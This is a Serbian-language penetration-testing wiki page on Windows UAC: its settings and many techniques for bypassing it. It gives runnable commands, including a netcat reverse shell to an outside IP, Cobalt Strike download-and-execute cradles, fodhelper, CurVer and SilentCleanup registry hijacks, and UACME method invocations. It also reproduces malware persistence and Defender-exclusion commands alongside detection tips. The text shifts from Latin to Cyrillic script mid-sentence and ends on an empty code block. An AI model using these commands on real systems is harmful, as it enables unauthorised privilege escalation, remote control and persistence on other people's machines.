# UAC - Kontrola korisničkog naloga

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za potvrdu pri aktivnostima koje zahtevaju povišene privilegije**. Aplikacije imaju različite nivoe `integrity`, a program sa **visokim nivoom** može da izvršava zadatke koji **potencijalno mogu da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvršavaju u bezbednosnom kontekstu naloga koji nije administratorski**, osim ako administrator izričito ne odobri tim aplikacijama/zadacima administratorski pristup sistemu radi izvršavanja. To je praktična funkcija koja štiti administratore od nenamernih izmena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>

Više informacija o nivoima integriteta:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, administratorski korisnik dobija 2 tokena: standardni korisnički token za uobičajene radnje na srednjem nivou integriteta i token sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše i obuhvata proces prijavljivanja, korisničko iskustvo i UAC arhitekturu.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne smernice za konfiguraciju načina rada UAC-a u svojoj organizaciji, lokalno (pomoću secpol.msc) ili konfiguracijom i primenom putem objekata grupnih smernica (GPO) u Active Directory domenskom okruženju. Različita podešavanja su detaljno opisana [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC se može podesiti 10 postavki grupnih smernica. Sledeća tabela sadrži dodatne pojedinosti:

| Postavka grupnih smernica                                                                                                                                                                                                                                                                                                                                                           | Ključ registratora                | Podrazumevana postavka                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kontrola korisničkog naloga: režim odobravanja administratora za ugrađeni administratorski nalog](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: ponašanje zahteva za potvrdu povišenih privilegija za administratore u režimu odobravanja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zahtev za potvrdu za binarne datoteke koje nisu iz Windows-a na bezbednoj radnoj površini) |
| [Kontrola korisničkog naloga: ponašanje zahteva za povišene privilegije za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Zahtev za akreditive na bezbednoj radnoj površini)         |
| [Kontrola korisničkog naloga: otkrivanje instalacija aplikacija i zahtev za povišene privilegije](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno u izdanju Enterprise)           |
| [Kontrola korisničkog naloga: dozvoli povišene privilegije samo za potpisane i validirane izvršne datoteke](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: dozvoli povišene privilegije samo za UIAccess aplikacije instalirane na bezbednim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: pokreni sve administratore u režimu odobravanja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: dozvoli UIAccess aplikacijama da zahtevaju povišene privilegije bez korišćenja bezbedne radne površine](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: pređi na bezbednu radnu površinu prilikom zahteva za povišene privilegije](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: virtuelizuj neuspele upise datoteka i registratora na lokacije specifične za korisnika](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |

### Smernice za instaliranje softvera u Windows-u

**Lokalne bezbednosne smernice** (u većini sistema „secpol.msc“) podrazumevano su podešene tako da **spreče korisnike koji nisu administratori da instaliraju softver**. To znači da, čak i ako korisnik koji nije administrator može da preuzme instalacioni program za vaš softver, neće moći da ga pokrene bez administratorskog naloga.

### Ključevi registratora za obavezivanje UAC-a da zatraži povišene privilegije

Kao standardni korisnik bez administratorskih prava, možete da podesite da UAC **zatraži akreditive od „standardnog“ naloga** kada pokuša da izvrši određene radnje. Za to je potrebno izmeniti određene **ključeve registratora**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass** ili je napadač već prijavljen kao administrator.

Čak i ako je korisnik u grupi **Administrators**, ove izmene primoravaju korisnika da **ponovo unese akreditive svog naloga** da bi izvršio administrativne radnje.

**U praksi, ovo je korisno samo ako već imate token sa povišenim privilegijama, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava da izmenite ove ključeve; u suprotnom, upis u registrator biće blokiran.**

Ključevi i unosi registratora koje treba izmeniti su sledeći (podrazumevane vrednosti su u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Ovo se može uraditi i ručno pomoću alata Local Security Policy. Nakon izmene, administrativne operacije traže od korisnika da ponovo unese svoje akreditive.

### Napomena

**Kontrola korisničkog naloga nije bezbednosna granica.** Zato standardni korisnici ne mogu da izađu iz svojih naloga i dobiju administratorska prava bez lokalnog exploit-a za eskalaciju privilegija.

### Zatražiti od korisnika „potpun pristup računaru“

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC privilegije

- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su veb-pregledači) da pristupaju podacima sa niskim nivoom integriteta (kao što je fascikla sa privremenim internet datotekama). To se postiže pokretanjem pregledača sa tokenom niskog integriteta. Kada pregledač pokuša da pristupi podacima sačuvanim u zoni niskog integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada daljinskim izvršavanjem koda da pristupe osetljivim podacima na sistemu.
- Kada se korisnik prijavi u Windows, sistem kreira token za pristup koji sadrži listu korisnikovih privilegija. Privilegije su definisane kao kombinacija korisnikovih prava i mogućnosti. Token sadrži i listu korisnikovih akreditiva, koji se koriste za autentifikaciju korisnika na računaru i pristup resursima na mreži.

### Autoadminlogon

Da biste podesili Windows da automatski prijavi određenog korisnika pri pokretanju, postavite **`AutoAdminLogon` registry key**. Ovo je korisno u okruženjima sa kioscima ili za potrebe testiranja. Koristite ovo samo na bezbednim sistemima jer se lozinka izlaže u registru.

Podesite sledeće ključeve pomoću Registry Editor-a ili `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Da biste vratili uobičajeno ponašanje pri prijavljivanju, postavite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da je UAC bypass jednostavan ako imate grafički pristup žrtvi, jer možete jednostavno da kliknete na „Yes“ kada se pojavi UAC prompt.

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces radi u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada administratorskoj grupi**.

Važno je napomenuti da je **mnogo teže zaobići UAC kada je podešen na najviši nivo bezbednosti (Always) nego kada je podešen na bilo koji drugi nivo (Default).**

### Brza trijaža iz shell-a sa srednjim nivoom integriteta

Pre nego što pokušate bypass, potvrdite da ste u odgovarajućoj situaciji i utvrdite verziju hosta kako biste pronašli poznate metode koje rade:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Praktične napomene:
- Ako je `EnableLUA=0`, zaobilazno rešenje nije potrebno: svaki administratorski token može direktno da zatraži visok nivo integriteta.
- `ConsentPromptBehaviorAdmin=2` ili `5` je uobičajen scenario za auto-elevate / COM-based bypasses.
- `Always Notify` podiže lestvicu, ali ipak testirajte konkretnu verziju umesto da pretpostavite da neće uspeti: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na modernim verzijama Windows-a.<sup>[[3]](#references)</sup>

### UAC je onemogućen

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **da pokrenete reverse shell sa administratorskim privilegijama** (visok nivo integriteta) koristeći nešto poput:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass sa dupliciranjem tokena

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Lokalni RPC + ponovo upotrebljiv debug objekat

Lokalni RPC interfejs AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` može da kreira proces sa omogućenim debuggingom. Procesi kreirani uz debugging na istoj niti dele debug objekat te niti; događaj kreiranja sadrži handle procesa sa punim pristupom, čak i kada RPC rezultat daje samo ograničen pristup. Tako ponovna upotreba debug objekta postaje UAC primitiva za člana grupe Administrators sa srednjim nivoom integriteta.<sup>[[11]](#references)[[12]](#references)</sup>

Praktičan niz koraka je:<sup>[[11]](#references)[[12]](#references)</sup>

1. Pozovite lokalnu RPC metodu (direktno ili preko `NdrAsyncClientCall`) da biste kreirali žrtveni proces koji nije podignut, uz omogućen debugging.
2. Upitom za `ProcessDebugObjectHandle` pomoću `NtQueryInformationProcess` pribavite objekat, odvojite ga pomoću `NtRemoveProcessDebug`, sačuvajte ga i prekinite žrtveni proces.
3. Upotrebite isti RPC interfejs da biste kreirali pouzdan, automatski podignut proces, a zatim povežite sačuvani objekat sa pozivajućom niti preko `DbgUiSetThreadDebugObject`.
4. Pozovite `WaitForDebugEvent` i preuzmite handle procesa `CREATE_PROCESS_DEBUG_EVENT`; duplicirajte ga pomoću `NtDuplicateObject` пре него што наставите.
5. Prosledite duplicirani handle funkciji `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` i pokrenite payload pomoću proširene strukture startup-info. Time se ponovo koristi kontekst podignutog procesa, a dete dobija odnos sa roditeljem koji izgleda pouzdano.

Tražite kratku sekvencu, a ne samo automatski podignutu binarnu datoteku: kreiranje procesa preko lokalnog AppInfo RPC-a, upite za `ProcessDebugObjectHandle`, odvajanje/ponovno povezivanje debagera, neposredni događaj debugovanja pri kreiranju, dupliciranje handle-a i dete čiji zabeleženi roditeljski proces ne odgovara procesu koji je pozvao API-je za kreiranje.<sup>[[12]](#references)</sup>

### **Veoma** osnovni UAC „bypass“ (pun pristup sistemu datoteka)

Ako imate shell sa korisnikom koji pripada grupi Administrators, možete lokalno da **montirate deljeni resurs C$** preko SMB-a (sistema datoteka) na novi disk i imaćete **pristup svemu u sistemu datoteka** (čak i matičnoj fascikli Administratora).

> [!WARNING]
> **Izgleda da ovaj trik više ne funkcioniše**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Zaobilaženje UAC-a pomoću Cobalt Strike-a

Tehnike za Cobalt Strike funkcionisaće samo ako UAC nije podešen na najviši nivo bezbednosti.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC-a**.

### Elevirani COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevirani COM objekti i dalje predstavljaju praktičnu UAC površinu napada na novijim verzijama sistema. UACME i dalje beleži da `ICMLuaUtil` radi na aktuelnim granama Windowsa, a ofanzivni alati nastavljaju da prilagođavaju `CMSTPLUA` kombinovanjem procesa sa interaktivnom radnom površinom, 64-bitnog izvršavanja i, ponekad, lažiranja PEB-a/procesa pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>

Praktični saveti:
- Dajte prednost **64-bitnom** procesu u korisnikovoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegovom podređenom procesu).
- Ako obična shell komanda ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto preko naivnog `CreateProcess` omotača.
- Očekujte da se podređeni proces pokrene kao **zaseban elevirani proces**; mnogi BOF-ovi ne eleviraju postojeći beacon u mestu.

### KRBUACBypass

Dokumentacija i alat su na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploiti za UAC bypass

[**UACME**](https://github.com/hfiref0x/UACME) je zbirka tehnika za UAC bypass. Kompajlirajte je pomoću Visual Studio-a ili MSBuild-a; proces izgradnje kreira nekoliko izvršnih datoteka (na primer, `Source\Akagi\output\x64\Debug\Akagi.exe`), pa izaberite metod koji odgovara ciljnoj verziji sistema.<sup>[[3]](#references)</sup>\
Budite oprezni: neki bypass-i pokreću vidljive programe ili upite koji mogu upozoriti korisnika.<sup>[[3]](#references)</sup>

UACME navodi **verziju build-a od koje je svaka tehnika počela da radi**.<sup>[[3]](#references)</sup> Možete da potražite tehniku koja utiče na vaše verzije:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Takođe, koristeći [ovu](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu, na osnovu verzija builda možete utvrditi izdanje Windowsa `1607`.

Praktičan postupak je da prvo **procenite build hosta**, a zatim pokrenete odgovarajuću metodu:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` brzo upoređuje lokalnu verziju sa poznatim UAC metodama, što je korisno za brzo odbacivanje neupotrebljivih PoC-ova.<sup>[[4]](#references)</sup>
- `UACME` je i dalje najbolji javni katalog za povezivanje bypass-a sa tačnom verzijom. Verzija 3.7.1 dodala je metode 83–85, dok je prethodno izdanje ponovo testiralo postojeće metode na **Windows 11 25H2**; ponovo proverite tabelu metoda i beleške o izdanju, umesto da pretpostavite da stari PoC i dalje funkcioniše nepromenjen.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess lanci kompatibilni sa Always Notify (UACME 3.7.1)

`Always Notify` ne eliminiše sve UAC bypass-e. UACME 3.7.1 implementira tri nova x64 metoda koja kombinuju stanje okruženja/protokola pod kontrolom korisnika sa ponašanjem povišenih zakazanih zadataka ili UIAccess-a i označava sve kao `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** preusmerite `SystemRoot` tako da WNF-pokrenuti `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` navede povišeni `taskhostw.exe` da side-load-uje `unifiedconsent.dll`. UACME prati ovaj metod od Windows 10 build 19041.
- **84 — TabTip:** upotrebite isti primitiv promenljive okruženja protiv UIAccess `TabTip.exe`, koji učitava `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ili `rsaenh.dll`, u zavisnosti od verzije, a zatim pređite iz nastalog UIAccess konteksta visokog integriteta. UACME prati ovaj metod od Windows 8.1 / Server 2016.
- **85 — Narrator:** preotmite korisnički `feedback-hub` protokol, upravljajte Narrator-om pomoću `Alt+CapsLock+F`, a zatim pokrenite upisivu kopiju `osk.exe` koja side-load-uje `OskSupport.dll`. Za ovo je potrebna interaktivna radna površina; metod se prati od Windows 10 1809 / Server 2019.

Nakon što izgradite payload jedinice i Akagi, kao što je dokumentovano u UACME, pozovite odgovarajući broj metode (opciona komanda podrazumevano je `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Metode 84 i 85 zavise od UIAccess/interakcije sa desktopom, zato ne očekujte da rade neizmenjene iz Session 0 ili neinteraktivne servisne ljuske. Sve tri menjaju stanje okruženja/protokola i postavljaju DLL-ove; pregledajte implementaciju i uklonite te artefakte nakon testiranja.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` automatski dobija povišene privilegije u modernom Windowsu. Kada se pokrene, proverava putanju registra za trenutnog korisnika navedenu ispod, a da pritom ne proverava glagol `DelegateExecute`. Postavljanjem komande na tu lokaciju, proces sa Medium Integrity nivoom (korisnik je član grupe Administrators) može da pokrene proces sa High Integrity nivoom bez UAC upita.

Putanja registra koju proverava fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell koraci (podesite svoj payload, pa ga pokrenite)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Napomene:
- Radi kada je trenutni korisnik član grupe Administrators, a nivo UAC-a je podrazumevani/lenient (ne Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da biste pokrenuli 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Radi stealtha izbegavajte iskačuće korisničke interfejse.

#### Okidač `ComputerDefaults.exe` za isti rukovalac `ms-settings`

`ComputerDefaults.exe` razrešava istu asocijaciju `ms-settings\Shell\Open\command` za trenutnog korisnika kao `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Nakon što podesite podrazumevanu komandu i praznu vrednost `DelegateExecute` kao što je navedeno iznad, koristite `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` kao alternativni okidač; nemojte ponavljati podešavanje registra.<sup>[[13]](#references)[[14]](#references)</sup> I dalje važe preduslovi u vezi sa administratorskim nalogom srednjeg nivoa integriteta i UAC politikom navedeni iznad u napomenama za `fodhelper.exe`.<sup>[[2]](#references)[[3]](#references)</sup> UACME uvrštava ovaj okidač počevši od Windows 10 RS4 (build 17134), pa ga proverite na ciljnoj verziji.<sup>[[3]](#references)</sup>

#### Varijanta otmice CurVer/ekstenzije (samo HKCU)

Noviji uzorci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju ProgID `ms-settings`** putem vrednosti `CurVer za trenutnog korisnika. Binarna datoteka koja se automatski povišuje i даље разреšава руковалац под `HKCU`, тако да за постављање кључева није потребан администраторски токен:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Kada dobije povišene privilegije, malware često **onemogućava buduće upite** tako što postavlja `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim sprovodi dodatno izbegavanje odbrane (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence kako bi se pokretao sa visokim integritetom. Tipičan zadatak za persistence čuva **XOR-enkriptovanu PowerShell skriptu** na disku, a zatim je svakog sata dekodira i izvršava u memoriji:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Ova varijanta i dalje uklanja dropper i ostavlja samo staged payloads, pa se detekcija oslanja na praćenje **`CurVer` hijacka**, izmena `ConsentPromptBehaviorAdmin`, kreiranja Defender izuzetaka ili zakazanih zadataka koji dešifruju PowerShell u memoriji.<sup>[[5]](#references)</sup>

### UAC bypass putem zadatka `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete preusmeriti to proširenje na proizvoljnu komandu i dobiti visok nivo integriteta bez dijaloga za saglasnost.<sup>[[8]](#references)</sup> Ovu metodu i dalje vredi testirati na novijim verzijama, jer UACME i dalje podržava ovu tehniku, a nedavno praćenje problema ukazuje na to da Windows 11 24H2 možda zahteva samo manje izmene navodnika.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Ako zadatak na toj verziji navodi putanju u navodnicima, pokušajte ponovo sa payload-om koji se završava navodnikom (na primer `cmd.exe"`). Uvek očistite `HKCU\Environment\windir` nakon testiranja.

#### Još UAC bypass tehnika

Za mnoge klasične UAC bypass tehnike koje zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom potrebna je **potpuna interaktivna sesija** sa žrtvom; uobičajeni `nc.exe` shell ili servis koji radi u **Session 0** često nisu dovoljni.

Ovo često možete rešiti pomoću **meterpreter** sesije. Migrirajte u **proces** čija je vrednost **Session** jednaka **1**:

![Usmerite ms-settings ka prilagođenoj ekstenziji (.thm) i povežite tu ekstenziju sa našim payload-om - Još UAC bypass tehnika: Ovo možete uraditi pomoću meterpreter sesije. Migrirajte u proces čija je vrednost Session...](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC bypass pomoću GUI-ja

Ako imate pristup **GUI-ju, možete jednostavno prihvatiti UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno da se zaobiđe praktična prepreka koju UAC predstavlja.

Pored toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP-a), **neki alati će raditi kao administrator**, pa biste odatle mogli direktno da **pokrenete**, na primer, **cmd** **kao administrator**, bez ponovnog UAC prompta, koristeći alat kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti nešto **stealthy**.

### Bučni brute-force UAC bypass

Ako je buka prihvatljiva, alat kao što je [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) može više puta da zatraži podizanje privilegija dok korisnik ne prihvati.

### Sopstveni bypass - Osnovna metodologija za UAC bypass

Ako pogledate **UACME**, primetićete da **mnoge UAC bypass tehnike zloupotrebljavaju DLL hijacking** (često tako što nateraju binarnu datoteku sa povišenim privilegijama da učita DLL pod kontrolom napadača sa putanje na koju može da se upisuje). [Pročitajte ovo da biste saznali kako da pronađete ranjivost na DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binarnu datoteku koja će **autoelevate** (proverite da li se pokreće sa high integrity level-ом).
2. Pomoću procmon-a pronađite догађаје "**NAME NOT FOUND**" који могу бити рањиви на **DLL Hijacking**.
3. Вероватно ћете морати да **упишете** DLL у неку **заштићену путању** (као што је C:\Windows\System32), у коју немате дозволу уписа. Ово можете заобићи помоћу:
   1. **wusa.exe**: Windows 7, 8 и 8.1. Омогућава издвајање садржаја CAB датотеке у заштићене путање (јер се овај алат извршава са high integrity level-ом).
   2. **IFileOperation**: Windows 10.
4. Припремите **скрипту** за копирање DLL-а у заштићену путању и покретање рањиве бинарне датотеке која се аутоматски покреће са повишеним привилегијама.

### Још једна UAC bypass техника

Састоји се у праћењу да ли **autoElevated бинарна датотека** покушава да **прочита** из **registry-ја** **име/путању** бинарне датотеке или **команду** коју треба **извршити** (ово је занимљивије ако бинарна датотека тражи ове информације унутар **HKCU**).

### UAC bypass преко `SysWOW64\iscsicpl.exe` + DLL hijack-а преко корисничког `PATH`-а

32-битна датотека `C:\Windows\SysWOW64\iscsicpl.exe` је бинарна датотека која се **аутоматски покреће са повишеним привилегијама** и која се може злоупотребити да учита `iscsiexe.dll` према редоследу претраге. Ако можете да поставите злонамерни `iscsiexe.dll` у фасциклу у коју корисник може да уписује, а затим измените `PATH` тренутног корисника (на пример, преко `HKCU\Environment\Path`) тако да се претражује та фасцикла, Windows може да учита DLL нападача унутар процеса `iscsicpl.exe` са повишеним привилегијама **без приказивања UAC prompt-а**.<sup>[[1]](#references)[[6]](#references)</sup>

Практични савети:
- Ово је корисно када је тренутниот корисник у **Administrators** групи, али због UAC-а ради са **Medium Integrity**.
- Копија у **SysWOW64** директоријуму је релевантна за овај bypass. Третирајте копију у **System32** директоријуму као засебну бинарну датотеку и независно проверите њено понашање.
- Ова техника комбинује **auto-elevation** и **DLL search-order hijacking**, па је исти ProcMon поступак који се користи за друге UAC bypass технике користан за проверу да ли недостаје учитавање DLL-а.

Минимални поступак:

```cmd
